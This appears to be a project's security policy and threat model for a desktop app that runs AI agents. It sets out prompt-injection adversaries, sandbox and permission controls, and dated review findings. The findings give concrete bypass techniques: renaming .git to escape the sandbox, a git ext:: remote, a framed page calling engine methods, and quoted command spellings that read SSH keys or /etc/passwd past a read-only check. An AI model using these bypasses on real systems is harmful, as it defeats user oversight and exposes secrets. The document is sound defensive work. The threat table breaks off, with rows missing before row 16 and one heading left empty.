# Security

Threat model and security policy for **Freeloop**. This document satisfies NFR-SEC-003 in [REQUIREMENTS.md](REQUIREMENTS.md) and is referenced by [RISKS.md](RISKS.md). It describes what the app protects, against whom, how, and what it does not protect against. Requirement IDs point to the controls.

## Reporting a vulnerability

Open a private security advisory on the GitHub repository, not a public issue. No person or address is named here, and no response time is promised: this is a project without a security team.

## What the app is

A desktop application that runs AI agents with the user's privileges on the user's machine. Agents read and write files, run shell commands, call tools provided by third-party MCP servers, and send project content to model providers chosen by the user. The agent's instructions come partly from the user and partly from content the agent reads, which may be hostile. That combination is the central security problem.

## Assets

| Asset | Where it lives | Why it matters |
|---|---|---|
| Provider API keys, MCP OAuth tokens, environment secrets | macOS Keychain only (SEC-004) | Direct financial and data loss if leaked |
| Project source and data | Project directories chosen by the user | Integrity: unwanted changes; confidentiality: sent to a provider or exfiltrated |
| The user's shell and home directory | The local environment runs as the user | Everything the user can do, an agent in `bypass` mode can do |
| Transcripts | `sessions/<id>/events.jsonl` | Contain code, tool output, and anything the user pasted |
| Configuration: rules, profiles, environments | YAML in the app support directory and `.freeloop/` in projects | Tampering with rules turns asking into auto-approval |
| Vendor sign-in state of external harnesses | Owned by the vendor binary, never by the app (HRN-008) | Both a legal and a security boundary |

## Trust boundaries

1. **User to app.** Trusted. The user's decisions in approval dialogs are authoritative.
2. **App to model provider.** The transport is trusted (TLS, the user's chosen endpoint). The model's output is **untrusted**: it is a proposal, not a command.
3. **App to external harness process.** Spawned by the app, speaks ACP over stdio. Treated as untrusted code: every file-system and terminal request it makes passes through the same environment and permission layers as the built-in tools (ARCHITECTURE.md section 12).
4. **App to MCP servers.** Third-party code and third-party data. Tool descriptions and results are untrusted content; the process is confined only by the environment it runs in.
5. **App to project content.** Untrusted until the user trusts the project (SEC-006), and the *content* stays untrusted even then: dependencies, fixtures, issues and documentation are all injection vectors.
6. **App to skills.** Installed deliberately by the user, so semi-trusted, but a skill's scripts are code and run under the same approvals as any shell command.
7. **Environment boundary.** The local environment offers no isolation beyond the user account. A Docker environment (v1) adds a container boundary. The policy layer never assumes isolation it was not told about.

## Adversaries

- **A1 Remote author of content the agent reads.** Plants instructions in a repository file, a web page, a dependency README, an issue, or an MCP tool result, hoping the model follows them. Most likely and most important.
- **A2 Author of a malicious extension.** Publishes an MCP server, a skill, or a harness preset that behaves well until it does not: poisoned tool descriptions, exfiltrating tool arguments, scripts that read beyond their purpose.
- **A3 A misbehaving model or provider.** Rare, but identical in effect to A1 and covered by the same controls.
- **A4 Local attacker with the same user account.** Another process or person who can read the user's files. Defended by file permissions and the Keychain, which keeps a key from a process that asks for it, not from one that changes where the app sends it; hence the address kept with each key (see the review of 2026-11-02). Such a process can still do whatever else the user can.
- **A5 The user's own haste.** Bypass mode on an untrusted repo; a rule like `allow shell(*)`; a secret pasted into a prompt.
- **A6 Someone on the user's network, or with their phone (GUI-052).** With the phone on: another device or user on the user's tailnet, a page in a browser on this computer, a command in a session's sandbox knocking on the phone server's port, a stolen phone or its key.

Out of scope: an attacker with root or kernel access, physical access to an unlocked machine, a compromised macOS, or a compromised provider account on the vendor side.

The Mac's app is signed ad hoc and not notarized until the project has a Developer ID (OQ-057), and Windows files carry no Authenticode signature, so the system itself vouches for no download |

| 16 | A remote MCP server's OAuth metadata points at a service on the user's network, or its sign-in page is a `file:` or app URL | Requests from the app to internal services; a local file or app opened | The sign-in's requests refuse private and loopback addresses unless the server itself is on one; only `https` (or loopback `http`) sign-in pages open, and only after the user chose "Sign in…" (MCP-006) |
| 17 | A token optimizer changes what a command does, or a repository or a planted file steers it | Commands the user did not approve run, or a command's result changes | The broker approves the command as the model wrote it, and the optimizer is asked only afterwards (HRN-019). Only a plain line goes to it, for tools it lists: a pipe, redirection, substitution, parenthesis, comment, assignment or `$'...'` keeps the line as written, since shortened output would change what the next step does and those shapes can hide a command from the check. A rewrite must be exactly the program's name and the approved command; for the few a program renames, as `read` for `cat`, its other words come from the original or are options and numbers. Anything else, and any failure, runs the original, and one that hangs is asked once a minute. The list matters: RTK runs a copy of `tsc`, `jest`, `gradle` and others from the repository, which the approved command would not have, so those stay out of it. For the built-in agent it is asked from `/` with no home folder, so no project or agent settings change the answer, and a program inside the project is refused unrun. Its own agent hook is never used, because RTK's answers "allow" when a repository says so (OQ-029). For Claude Code, Freeloop's own hook in the session's plugin asks instead, from the project with the real home folder, so the program also honours the agent's deny rules, and it adds no permission answer to what it returns. It fails open: with the app gone or slow, the command stays as written. The broker judges what the model wrote, mapped back by exact match, and a rewrite is allowed unasked only when that original is on the narrow read-only list and no deny rule applies. If the user's settings already hold RTK's own hook, Freeloop cannot switch it off and says so. The offered download is pinned by version and SHA-256, starts only on the user's click, is refused in local-only mode and goes into the app's caches, where a sandboxed session can run it and not change it. A git repository whose `.git/config` is already hostile can run programs through `git status` or `git diff`, as it can when the agent runs them by itself. Only the user can choose one: a project's profile cannot, listing runs nothing since another program can have the same name, and a file's optimizer runs only once approved as it is, with a mark only the app can compute, so a restored backup or planted file does nothing by itself. The same goes for a file choosing one, built-in ones included, in `defaults.optimizer` or a profile's `optimizer`: until approved, sessions start with it off. Its variables must start with the program's name, so it cannot set PATH or DYLD variables. An install command is one line of plain text, typed for the user to run. It runs in the session's sandbox or container; what it keeps is out of reach of sandboxed sessions when the session ran unconfined, and is shared among a project's sandboxed sessions, as their work is. Choosing one still trusts that program, which runs with the session's rights |
| 18 | A restored backup, or anything else that can write to the data folder, adds a hook or an agent preset, or replaces a built-in preset | A command runs with every session, outside the broker and any sandbox | A hook in `config.yaml` or a profile, and a preset file, run only with a mark from a key in the Keychain, which a file cannot compute (SET-005). The app adds the mark when the user writes the command in the app or approves it in Settings; a form sending back a waiting hook does not approve it. Until then a hook is skipped with a notice in the session, a preset refuses to start, and both are listed among the problems the app shows. The marks cover the YAML files (`config.yaml`, profiles, `rules.yaml`, environments, `mcp.yaml`, presets, workflows, optimizers); they do not cover `devices.json`, project trust in the database, or session rules replayed from a transcript, which stay as the data folder holds them. If the Keychain item holding the key is gone (a reset Keychain, a new computer), the app makes a new key and adopts nothing: every mark in the files fails, hooks, allow rules, `accept_edits`, environments, bypass and addresses wait for the user's yes again, and Settings says why (SEC-018). On Linux the key is in the Secret Service, which any process of the same user can read, so a process running as the user can sign a mark; the marks keep out what only writes files |
| 19 | The session's controls reach further than asked | An agent's own mode loosens permissions, or a click on Finder runs something in the project | An agent's options are offered only for its model and effort, and only values it listed can be chosen, so its mode, which can read "bypass", stays out of reach and the app's Permissions setting decides (PRV-014). The Finder button takes the folder from the session, never from the page. Opening a folder named like an app runs that app, `open -a Finder` included, which a test with a harmless fake bundle proved, so a folder with an extension is only revealed in its parent (GUI-024). An attached file is the user's own choice, goes only into that message, and must be valid text (SES-019). A rule added in a session is the same choice as "Allow always": deny rules still win and an allow rule never lifts plan mode or protected paths |
| 20 | An imported session brings in what its transcript holds, or the import runs something | Keys the agent once read land in the app's data folder, or a replay acts on the Mac | The agent is started only to list, copy and replay: while it does, a permission request is cancelled and file and terminal requests are refused, so a hostile or confused agent cannot use the import to act (SES-020). No model is called. A transcript can hold anything the agent read, so the page says so before anything is chosen, and events pass through the same redaction as any session's; that catches known secrets, not every key. The agent itself writes its copy into its own store; Freeloop writes nothing there. Titles and text come from the agent and are shown as text, never markup. The project keeps its trust as it was: importing does not trust a folder. A container environment is refused, because it cannot see the agent's sessions |
| 21 | Voice input's speech program or model is swapped, or what is said leaks | A program the user did not choose runs as them, or their speech leaves the computer | The program and the model are pinned by SHA-256 (the Mac's program is built from whisper.cpp's pinned source and carried in the app), downloaded only on the user's click, refused in local-only mode and kept in the app's caches, where a file cannot name another. `whisper-cli` runs only while the user dictates, through the environment layer with its process group and crash ledger, and reads the recording from its stdin: it opens no port, unlike `whisper-server`, whose `/load` takes any path and whose answers allow any origin, and which a sandboxed session could reach on localhost. The recording is held in memory and on the pipe and never written to disk. On a Mac only the app has the microphone entitlement; the program it carries is signed without it. The window may open the microphone without asking again on top of the system, which asks once; the page runs only the app's own scripts and model output never becomes markup in it (GUI rule) |
| 22 | Someone reaches the phone server (A6) | They read sessions, send messages or allow requests | Off by default, and from a file only once approved. It listens on 127.0.0.1; the user's own Tailscale carries it to their phone, encrypted, and the app runs no relay and makes no connection for it, except that a phone which turned notifications on gets Web Push: a message of its kind and session ID, encrypted for that phone alone (RFC 8291), sent to the push service its browser named, which must be Apple's, Google's or Mozilla's (the endpoint is checked when it is kept and again when it is used, a redirect is never followed, and local-only mode sends nothing). The push service sees that a message was sent and when, not what it says. Requests naming another host (DNS rebinding) or carrying Tailscale's Funnel header are refused; a post needs the app's own header and an Origin of its host, which a page elsewhere cannot send. Only listed routes exist: no terminal, setting, rule, file, secret or new session. A phone gets in only after a one-time 100-bit code (five tries, five minutes) and the user's yes on the computer, which no process can give; its 256-bit token is kept as a hash in the data folder, which sandboxes cannot read. The phone app holds the token in its own storage and sends it as a header, never as a cookie, since a cookie goes to every port of the same host and so to a dev server an agent wrote on the same tailnet name; the token is refused without the Tailscale login the phone paired as, or under another, and after 90 days unused, and a phone signed out loses its open streams at once. From the phone a request is answered once, by the option's kind looked up by the engine; forms, plans and "always" wait for the computer. Every message and decision from the phone says so. A command in a session's sandbox can connect to the port, as to any on this computer: tried on macOS 27, the sandbox cannot deny one port of localhost while allowing the rest (a later deny does not override the earlier allow), and Linux's pasta forwards every port. It gets nothing there without a paired phone's token, and cannot pair one, since pairing needs the code shown on screen and the user's yes. Local-only mode turns it off. Tailscale's HTTPS certificates are public, so the computer's tailnet name becomes known; the page says so |

## Design rules that follow

- **One chokepoint.** Every side effect from any harness passes through the permission broker (SEC-003). Nothing is auto-approved on timeout.
- **Policy below the protocol.** Path and execution policy is enforced in the environment layer, so neither a tool, a skill, nor an external agent's protocol request can route around it.
- **Deny wins.** A deny rule at any scope beats an allow at any scope. Project-level configuration can tighten but never loosen.
- **A repository's PDF stays in its frame.** WebKit draws it only unsandboxed, so a Content Security Policy on the viewer frame stops its links; `make check-app` clicks a hostile one (OQ-035). A bug in Apple's PDF parser would still run in the web process of the app's page.
- **Secrets never touch disk.** A draft stored for a restart is redacted first, so only a secret the app knows is caught, as in a transcript (SES-023). Keychain references in config, all in one Keychain item (OQ-033) that no reference can name; values resolved at spawn; child processes receive only configured variables (SEC-008).
- **Untrusted by default.** Projects, tool output, model output and MCP content are untrusted until a human says otherwise, and content stays untrusted after the project is trusted.
- **Readable state.** Transcripts are the audit log (SEC-007): every change traces to a call and a decision with its actor.
- **No undeclared network.** Only user-configured endpoints; no telemetry (SEC-009).

## Limitations the user should know

- The local environment is **not a sandbox**. In `bypass` mode an agent can do anything the user can. Use a Docker environment for repositories you do not trust: its commands and external agents run in a container that sees the project folder and the image, not the rest of your files. The container still has network access and runs as the image's user (often root), and it can change anything in the project folder, which is shared with the host, except what the host reads and acts on: the project's `.freeloop/` (hooks, rules, profiles; created empty when missing so the container cannot create it) and the devcontainer files are mounted read-only. Values from `devcontainer.json` go into the container on the docker command line and never into the environment of the docker CLI on the host, and its Dockerfile and build context must resolve inside the project. The repository's `.git/config`, `config.worktree` and `hooks/` are read-only in the container too, so a command there cannot plant a hook or a filter in them (a worktree session also gets the main checkout's `.git`, which its worktree points into, under the same rule). The rest of `.git` stays writable, because git in the container needs it, and that is a limit: **your own git on the Mac, in a terminal, runs what a container planted through `.git/commondir`, or in a `.git` it created in a folder that had none.** Treat such a checkout as untrusted outside the app. The app's own git refuses a moved common directory. A read-only path that is a symbolic link stops the container from starting, since Docker would mount what it points to. A worktree session's setup, run and archive commands run in the container, never on the Mac, where they would run with the environment's secrets whatever the container wrote into the worktree; should the session's environment later stop being Docker, they refuse to run on the Mac in a worktree a container has had. Only `copy` happens on the Mac, from the main checkout into the worktree, through the same write guards as the agent's file tools. Stopping a command ends it inside the container, children included, not just the docker client on the host. The app's git commands on the host refuse to scan or stage in a repository whose own configuration, `config.worktree` and includes counted, names content filters, signing programs, config-based hooks, merge drivers, a promisor remote or protocol settings, since a command in the container can write `.git`. Checkpoints leave nested repositories out and the app's status and diff ask nothing of them, because git would start in one under that repository's own config.
- **The native sandbox holds shell commands, not everything.** In a sandboxed environment (ENV-009, Seatbelt through `sandbox-exec`) the built-in agent's `shell` tool and an external agent's `terminal/*` requests, the setup, run and archive commands, and hooks run confined: they write only in the project, its caches and temp files; home is closed except toolchains, and shell startup files and git's own config are closed too, since keys are kept in them (what they set reaches commands from one login shell outside the sandbox, without what looks like a secret); `.git/config`, git hooks, every nested `.git` and `.freeloop`, and other files tools act on later are read-only; deny rules on paths hold; only this Mac's loopback is reachable, or nothing, or also the hosts an environment lists (ENV-010), or for the setup, run and archive commands the internet; hooks have the environment's own setting. So such commands need no approval, and leaving the sandbox asks every time and cannot be allowed always. If the sandbox will not apply, or a self-test finds it lets a write through, nothing runs. What it does not cover: an external agent's **own** tools, which run in its process (so its requests still ask, and a Docker environment is the answer for agents you do not trust); MCP servers; what you type in the terminal; the file tools, which keep their own guards and approvals. It also has limits inside: loopback reaches anything else listening on your Mac, `/tmp` is shared, reads outside home are open, and a command can still write a Makefile that you later run yourself. Apple marks `sandbox-exec` deprecated with nothing to replace it for this use.
- **A listed host is a way out for data.** A host list stops a command reaching anywhere else, including from a tool ignoring the proxy, but a command can still send what it can read to a host on the list, and a host such as github.com accepts uploads from anyone. List what a project needs, and prefer read-only registries. The proxy does not open TLS, so it knows only the host, not the path.
- **A registry is text from strangers.** Anyone can publish to an MCP registry (MCP-009), so a listing can be misleading. Browsing sends only your search words, to an address you chose. Adding a server fills in a form; nothing runs until you confirm its exact command, which is pinned to the version listed, and what it fetches at that version is still its publisher's.
- **The integrated terminal is yours, unguarded.** What you type in a session's Terminal tab runs as you, in the session's environment, with no approval and no protected paths, like any terminal window; it is not recorded or shown to the model. In a Docker session it is a shell in the container.
- **Unknown secrets are not redacted.** Redaction works on values the app knows (stored secrets). A password typed into a prompt is sent to the provider and stored in the transcript.
- **Approval fatigue is real.** Rules exist to make trusted operations quiet so that prompts stay meaningful. Review rules periodically; the settings UI lists every rule with its source.
- **Transcripts are plaintext** on disk, protected only by file permissions.
- **MCP servers run with the user's privileges** in the local environment. Prefer servers you can read, pin their versions, and give remote servers the least access their OAuth scopes allow. A server starts only after you approve its exact configuration, and only with the base environment plus the variables and secrets you gave it; but once running it can do anything you can, and what its tools return reaches the model as data. Every MCP tool call asks unless a rule allows it, whatever read-only annotations the server sends.
- **Provider trust.** Everything in a session's context goes to the configured provider. Local models keep it on the machine; cloud providers' data handling is governed by their terms. That includes a secret a command prints: environment secrets are redacted from the transcript, not from the model's context.
- **Path rules cover file tools, not the shell.** Protected paths, the read-outside-root prompt and path rules apply to `read_file`, `write_file`, `edit_file`, `list_dir`, `glob` and `grep`. An approved shell command runs with the user's privileges and can read or write anywhere, including protected locations, unless the environment is sandboxed (ENV-009). Shell deny rules see through common wrappers (variable assignments, `env`, `command`, `exec`, subshells, `sh -c '…'`) and git's global options (`git -C dir push`), but a shell can always spell a command another way, so treat them as a guard against mistakes.
- **A mentioned file goes to the model without an approval.** Writing `@path` in a message attaches that file's contents, as pasting it would. The engine reads it through the environment, so protected paths stay refused, and only inside the project root (at most 20 files, 256 KB each, 1 MB per message); it is the user's choice of context, not a harness side effect, so no permission request is made. A deny rule on the file holds, because a message can carry text the user did not write, such as an issue's. Text the user did not type at all (a subagent's task, a review's diff, an MCP prompt) attaches nothing.
- **Project trust is one decision per folder.** Until a project is trusted (SEC-006) the app reads none of its instruction files or `.freeloop/` settings, except the hook commands it defines, which the trust prompt lists so the user sees what trusting would run, and runs only git plumbing with fetching turned off, so its configuration cannot make it run anything (`rev-parse`, `symbolic-ref`, `rev-list`, `config --get`). Once trusted, `git status` runs with `core.fsmonitor` and hooks off and is skipped where the repository configures content filters. Trust is not re-asked when the project's files change; distrust it from the project's banner or the new-session form if its contents change hands. A project's `.freeloop/` can only tighten: allow rules and modes looser than ask are refused, so a hostile repository cannot approve its own commands.
- **Worktree commands are the user's too.** Creating, removing and merging a session's worktree (SES-010) run git in the project's main checkout without a permission request, under the same guards as the diff panel; a merge happens only on your click, never by the agent, and skips hooks.
- **The diff panel's git actions are the user's, not the agent's.** Stage, commit and discard (GUI-005) run git through the session's environment without a permission request, because the user clicks them. They run with hooks and `core.fsmonitor` off, without external diff or textconv drivers, only on files the panel lists, and not at all in a repository whose local config (with includes) sets content filters, a signing program or config-based hooks (`filter.*`, `gpg.*`, `hook.*`), whose `core.hooksPath` setting would not cover the last. Commits from the panel therefore skip `pre-commit` and other hooks. Discard asks for a second click; a discarded new file is deleted. "Suggest message" sends the staged diff (at most 40 KB) to the session's provider.
- **Hooks are the user's commands and can only say no.** Hooks (EXT-005) run without a permission request, like the diff panel's git actions, because the user configured them; a project's `.freeloop/hooks.yaml` runs only once the project is trusted, and only as the set approved then or since, and the new-session form lists its commands. A hook in the app's own files runs only once written or approved in the app, so one edited in a text editor waits in Settings too. That includes a guard: a `pre_tool_use` hook edited outside the app stops denying anything until it is approved, and the session says so. A hook can block a tool call or a permission request, never approve one, and it runs only for calls the path policy and the deny rules let through, so it can neither widen what an agent may do nor be triggered by a call that is denied anyway.
- **MCP resources and prompts enter only by the user's hand.** A resource is read and a prompt rendered only when the user attaches or runs it (MCP-007), from a server the session uses and the user approved; the server's text becomes part of the user's message, shown in the conversation as sent. Like any context it can carry injected instructions, which the permission broker answers as it does for everything else the agent then tries.

- **A skill is instructions the model will follow.** Installing a skill, or trusting a project that ships skills, puts its description in every session's system prompt and its body in the context when the model loads it. Skills are never run on install: their scripts run only when the model calls the shell tool, which asks like any command (or matches your rules). Read a skill from a stranger before installing it; the preview lists its scripts.

- **An external agent decides what it asks about.** Freeloop routes every permission request an ACP agent makes through the broker, and serves its file and terminal requests through the environment, asking for any it was not just allowed. But an agent such as Claude Code runs its own tools inside its own process: what it does without asking, under its own settings (for example allow rules in `~/.claude/settings.json` or its bypass mode), is outside Freeloop's broker. The app mirrors its permission mode into the agent where the preset maps it, and says so when a preset has no plan mode to mirror; a review by such an agent is refused, since nothing would keep it read-only. An agent's report of its own mode can tighten the session's and loosen it only after the user approved its `switch_mode` request, never to bypass: the mode decides what the broker lets through, so an agent must not be able to choose it. One that switches itself to a mode its preset does not name is told the session's mode again. The presets for other agents (HRN-007) map every mode but plan to the agent's mode that asks, because several default to approving by themselves: goose's `auto`, Codex's `agent`, and OpenCode, which allows everything until `OPENCODE_PERMISSION` says otherwise; Copilot CLI's Autopilot turns on its own allow-all, so nothing maps to it. Copilot CLI over ACP also trusts the folder it is started in and runs the repository's hooks (`.github/hooks`, and hooks in `.github/copilot/settings.json` and `.claude/settings.json`) itself, where a hook can approve its tool calls; it has no setting the app could pass, so in an untrusted project it does not start while there are any (`HarnessPreset.RepoHooks`). Plan means each agent's own idea of read-only: Gemini CLI's, OpenCode's and Copilot CLI's plan, Codex's read-only sandbox, and goose's chat, which has no tools at all. `make verify-agents` checks all of this against the pinned versions, and a newer version of an agent can change it. The agent gets only the base environment plus the environment's variables and the session's MCP servers; the app never passes it vendor credentials (HRN-008).

- **Processes running as the user can see each other, outside a sandbox.** `ps -E` shows another process's environment, so a session's shell, a stdio MCP server or an external agent can read the variables of the app's other children, other MCP servers' tokens included. A sandboxed command cannot. Provider keys are never in a child's environment.
- **An external agent receives its session's MCP secrets.** To let it use a server, the app passes the server's headers and variables in `session/new`, values included, for every server the session uses. Use a profile that leaves a server out if an agent should not have its token.
- **Redaction recognizes what it was told.** Known secrets are replaced, also base64, URL-encoded and hex, wherever they appear whole. A secret under 8 characters is not, since it would match ordinary text; a key the app was never given (one a command prints from elsewhere) is not; transcripts written before a key was added keep it; and a secret split across different event kinds, a message and a thought, can leave a short piece.
- **The headless API is the user's.** The command line talks to the running app over a Unix socket in the data folder, which only the user can enter (or in their private `$TMPDIR`), so any process running as the user can start sessions and answer approvals through it, as it could by driving the app. It adds no new power: everything goes through the engine and the permission broker.
- **Local-only mode covers the app's own connections.** With `network.localOnly` on (NFR-OFF-003) every connection through the app's HTTP stack (providers, their SDKs, remote MCP servers) may reach only this Mac: loopback addresses and `localhost` names; other host names are refused before any DNS lookup, proxies are bypassed, and each attempt is listed in Settings. Containers created while it is on get no network. Processes the app starts on the Mac (commands, external agents, stdio MCP servers) run as the user and are not covered; run them in a Docker environment for that.

### Engine calls from a framed page, 2026-11-01

Every engine method is reachable with a POST to `/wails/runtime`, and Wails checks where such a request comes from only in its server build; in the desktop build the check is `return true`. The app preview (GUI-020) puts a page the agent may have written into a frame in the app's own WebKit, so this became reachable. Tried against the packaged app with a hostile page in the frame:

- A `no-cors` fetch reaches the app's URL scheme **with its origin stripped**, and without a guard it ran: the page created a session. Origin checks alone do not stop it. A page cannot set a custom header on such a request, so `x-wails-client-id`, which the app's own calls always carry, is required.
- A fetch with custom headers gets no preflight on the custom scheme and arrives with the header, but keeps its origin, so a foreign origin is refused. Both checks are needed; each stops what the other misses.
- A form post keeps its origin and has no header. `sendBeacon` refuses the scheme. Reading the parent's page is blocked, and the frame is sandboxed against popups and navigating the window.

- A page also chooses the **host** of what it sends to the custom scheme, and Wails skips its host check for `wails://`: `fetch("wails://localhost:41000/wails/runtime")` from `http://localhost:41000` arrives with both set to the same value. An earlier version of the guard compared them and let this through, which a second review found and the packaged app confirmed. The desktop build now takes no http origin at all; only the server build, which listens on a real address, compares them.

`netguard.RuntimeCallAllowed`, in a middleware ahead of Wails' handler in `cmd/freeloop/main.go`, enforces this. **Rerun that test after every Wails upgrade**: it depends on how WebKit delivers requests to a custom scheme, which the unit test can only describe, and the server build used for browser checks has Wails' own check and hides the problem. What stays reachable from a frame is `window.webkit.messageHandlers.external`, which Wails exposes to every frame: it can start a window drag or resize, nothing more, since `wails:event:emit` is off unless a window opts in and Freeloop's do not.

### Security review, 2026-11-02

Three independent reviews (secrets, what a model or repository can do, the app's own surface) and a run of the real app with a fake key against a stand-in model server. Every fix below has a regression test; the first attacks were rerun against the fixed code.

- **Sandbox escape.** Protecting `.git/config` meant nothing while `.git` could be renamed: a sandboxed command, with no approval, moved it aside, edited the config and moved it back, and the app's next git refresh ran the program it named, outside the sandbox. `.git` and the git folders of a worktree can no longer be moved (`Confinement.NoMove`), `.git/modules` and the other worktrees' folders are closed, and a planted `.git/commondir` no longer decides what a sandbox can write or trust. Git submodule commands therefore need to leave the sandbox.
- **Git running programs.** Plumbing was not as safe as this document said: `rev-list`, and so adding a folder before it is trusted, and every automatic refresh, could lazily fetch a missing object from a promisor remote whose `ext::` URL is a command. The app's git now never fetches (`GIT_NO_LAZY_FETCH`) and allows no transport (`GIT_ALLOW_PROTOCOL`, which repository config cannot override); the push, the checkpoint copy of a fork and the clone of a skill each name theirs. The refresh refuses what the panel refuses, a moved common directory included. In a partial clone a diff that needs a missing object fails instead of fetching it.
- **Sockets.** Commands with full network access (Run, setup, archive and hooks) could reach every Unix socket, `freeloop.sock` among them, and any confined command could reach those in `/tmp`, where a tmux server runs what it is told. Now no confined command reaches a socket outside its own project and temp folders, except the system's name lookups. So a Run script cannot use Docker or the SSH agent from a sandboxed environment, and a program whose socket path does not fit its `TMPDIR` has to use a shorter one.
- **Keys and addresses.** Anything able to write `providers.yaml`, a restored backup included, could point a provider at itself and have the app send the key, with no Keychain prompt. The Keychain item now holds the address with the key, a change made outside the app stops the key being sent until the user confirms it under Providers, and the search key works the same way (entering it again confirms). A file can name only the item the app itself would use, so it cannot have a vendor's sign-in or another secret read. MCP approvals are signed with a key in the Keychain instead of being a hash anyone can compute, which also closes approvals kept in a crafted backup. **Approved MCP servers need approving once more after this update.** A key stored before this takes the address it has at its next use. Release builds use the hardened runtime, which ignores `DYLD_INSERT_LIBRARIES` (tested: an unhardened binary tried to load the library, the packaged app did not).
- **Opening a file.** "Open in editor" used the file's own handler, so a `README.md` linked to a `.command` script ran it in Terminal, in an untrusted project too, past any sandbox. Files now open with `open -t`, the default text editor.
- **Skills.** `load_skill`, which reads without asking, followed links out of the skill, to files the sandbox refused. Links now stay in the skill's folder, and a project's skill in the project. `~/.ssh` was never reachable.
- **The Preview frame.** A page in the Preview tab could load the app's own page in a frame of its own, whose engine calls pass the guard since it has the app's address, and lay it invisibly over a button. The page now refuses to draw in a frame. Headers did not stop this: frame-ancestors and X-Frame-Options were ignored on the custom scheme. **Add this case when rerunning the test above in the packaged app.**
- **File tools.** A folder swapped for a link between a path's check and its open could read a guarded file or write outside the root (won in 397 tries). Files are now opened at the resolved path with no link followed anywhere in it (`O_NOFOLLOW_ANY`); 100,000 attempts of the same attack got nothing.

The rest of that review, fixed the same way:

- **Keys.** A cross-host redirect carried Anthropic and Gemini keys, since Go drops only `Authorization` (`provider.StayOnHost`), and https to http redirects resent secrets. MCP secrets stayed when a server's URL or command changed, so a repository's `.mcp.json` could collect a token; an import now inherits none, and an edit in the app keeps them only for the same URL and command. Addresses holding credentials are refused, a search key can go in the address as `{key}` and stays out of errors, and the provider form asks before a saved key goes to a new address and points out plain http. Stored keys and tokens are known to redaction from startup and after a reload. A key an endpoint repeats no longer reaches the log, and pending approvals show redacted commands everywhere. The import from Claude Code catches more secrets. Tokens in skill addresses are refused. Other programs' sign-ins, such as `~/.codex/auth.json`, `~/.netrc` and `~/.config/gh`, are never readable.
- **Rules.** "Allow always" on an external agent's request made a rule for the whole kind, so one click on reading an event allowed deleting a calendar; it now allows that call once. Spellings APFS treats as one name got past deny rules and protected paths (long s, the Kelvin sign, a decomposed accent). Shell deny rules see through more wrappers and through `$(...)`, quotes and backslashes, and where a sandbox would otherwise run a command unasked, a line with expansions asks if any shell deny rule exists. They are still a guard, not a boundary. Approval buttons say what their kind does, not what an agent named them. An external agent's terminal request shows its folder and variables, and its words cannot appear as the user's.
- **Bypass.** It is refused in an untrusted project, and leaving the sandbox asks in bypass too.
- **What runs later.** Nested `.git` and `.freeloop` are protected at any depth, in tools and in the sandbox; accept-edits asks about `.envrc`, `.vscode`, `.husky` and other agents' configuration; `core.hooksPath` is closed. A merge bringing in such files, which a sandboxed agent can commit though not write, asks first. A project profile cannot add MCP servers, choose another agent or set a fallback model.
- **Smaller.** The sandbox no longer reads startup files or `~/.gitconfig` (see the limitations). `freeloop.db` and its companions are `0600` and an existing data folder is tightened to `0700`. The command line strips bidi and zero-width characters and keeps titles to one line. `PrivateAddr` covers NAT64, 6to4 and other special ranges, and the OAuth exception for a local server covers that server only. A registry listing's `latest` is not a pin. A folder named `__proto__` no longer blanks the window, and an error boundary catches what else would: one around each pane and each page, so a view that fails to draw shows its failure with a problem report to copy and a way to close it, while the other panes, the sidebar and a waiting approval keep working, and the failed pane is not saved into the workspace (the window's own boundary is the last resort). Built pages have a Content-Security-Policy (no inline script, no source but the app's own, localhost frames for the preview), which the app check reads and runs under; `make dev` has none, since live reload needs an inline script. `make verify-agents` checks goose's checksum against `scripts/agents.sha256`; the first run pins it with `TRUST_NEW_AGENT=1`.

Fake keys were found in no file, log or event in the live run, and the agent's environment did not hold them. Not checked: real Keychain permission decisions and how ad hoc re-signing affects "Always Allow", the packaged app's window end to end, real vendor agents, and Docker (whether renaming `.git` in a container defeats its read-only mounts; the app's git on the Mac refuses the result either way).

### Production readiness, 2026-11-03

An independent re-check of the 2026-11-02 review at 3348cce reproduced these, each fixed and re-run against the same proofs:

## Review, 2026-11-03: holes in what asks

Found by reading the code and confirmed by tests that failed before the fixes. None was seen exploited.

- `permission.ReadOnlyCommand` judged a command as written, not as the shell reads it. `rg --pr"e=./x.sh" foo` passed and ran a script from the repository, `cat .""./.""./.ssh/id_rsa` passed and read outside the project, and `git blame --contents=/etc/passwd a` passed with the path in an option's value. For a session with a token optimizer on an external agent, the broker then allowed these without asking, in plan mode too. The check now resolves quotes first, treats an option's value as a path, and takes a long option's unique start as the option, as git does.
- A deny rule on a path could not stop a rewritten read: the request names no paths, so the rule never matched. While any path deny rule exists, such a command now goes to the user. It is not matched word by word, since a recursive search reaches a file without naming it.
- Bypass was checked only when chosen. A session kept it after the setting was turned off, after its approval ended or the project's trust was taken back, and across a restart. `Engine.dropBypass` now ends it in each of those cases, and `runtimeFor` checks again before a session starts.
- A mode change the index failed to record was never repaired, so a session could return to a looser mode. `replaySets` now restores a session's settings from the transcript on catch-up and when a transcript is opened, and `runtimeFor` reconciles before it reads the mode. A status is not replayed.
- A failed lookup of a project's hooks counted as no hooks, and so did a click before the lookup answered, so trusting skipped the question. Not knowing now looks again, and a failure refuses (`frontend/src/trust.ts`).
- Stopping an external agent's turn left its approval waiting, because the request's context belongs to the connection. A later Allow still answered the agent. A request now ends with its turn.

## An SSH environment, 2026-11-04

ENV-008 runs a session's commands on another machine. That machine is treated as compromised, with its `sh`, `tar`, `find` and whatever it prints: an approved command can do anything there. What this has to hold is the Mac.

**Connecting.** `/usr/bin/ssh`, never one from a PATH, and options on the command line, which win over `~/.ssh/config`: `StrictHostKeyChecking=yes`, `BatchMode=yes`, no agent or X forwarding, `ClearAllForwardings`, no local command, no tunnel. An unknown or changed host key refuses to connect and the user checks it in a terminal; Freeloop never accepts one, and never reads a key. A host or folder that could be read as an option or by a shell is refused where the environment is read. An environment from a file runs nothing until approved, with the machine in what is approved, and a changed file ends that. Each session has its own connection, in a folder private to the user, or none: never one the user's own config shares. Local-only mode is asked before anything goes, also while a session runs, and a host behind a proxy counts as not local. The broker asks about commands there as it does here.

**What leaves.** Only regular files, read here without following a link. In a repository, what git tracks or would track; a repository git cannot read sends nothing. Not sent, tracked or not: what looks like a secret, what a deny rule on reading covers, and settings of tools and agents. The copy gets a new repository of its own, so the project's history, remotes and credentials stay here. Variables reach a command through its standard input as octal escapes, never on a command line on either side, in a file there, or in the environment of ssh. Whatever else a file holds goes with it: a key in a source file is sent. The form says so, and to use a machine that can be lost.

